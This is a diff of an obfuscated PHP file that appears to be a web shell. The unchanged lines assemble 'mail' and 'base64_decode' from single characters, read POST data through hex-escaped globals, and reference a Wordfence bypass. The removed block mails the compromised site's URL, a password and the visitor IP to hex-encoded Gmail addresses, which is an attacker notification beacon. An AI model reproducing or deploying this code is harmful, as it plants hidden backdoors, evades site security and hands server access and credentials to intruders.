@@ -6317,7 +6317,6 @@ $嗐併倝傘搞銇仌倎銇媮($銇娿慵紙亖垇亞侊銈沣, '[Wordfence Byp
 
 ?>
 <?php
-
 error_reporting(0); 
 $亖銇笺亪偩亯唩亯锔競 = ('m'.'a'.'i'.'l');
 $沣倛傘檨粊嗐銊唩沣銇 = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
@@ -6328,15 +6327,4 @@ ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";
 
 
 <?php
-	@ini_set('output_buffering', 0);
-	@ini_set('display_errors', 0);
-	set_time_limit(0);
-	ini_set('memory_limit', '-1');
-	header('Content-Type: text/html; charset=UTF-8');
-	$main = "\x70a\x70a\x6bu\x2e\x68a\x79\x6b\x65r\x2e\x67o\x2eid\x40g\x6d\x61\x69l\x2ec\x6fm, p\x61paku\x2eh\x61\x79\x6b\x65\x72@\x67\x6da\x69l.\x63\x6fm";
-	$now = "\x68\x74\x74\x70\x3a\x2f\x2f" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-	$notif = "$now *PW : [ " . $▛ . " ]";
-	mail($main, "Ding non obf ", $notif, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-error_reporting(0);
-
-	?>
+?>
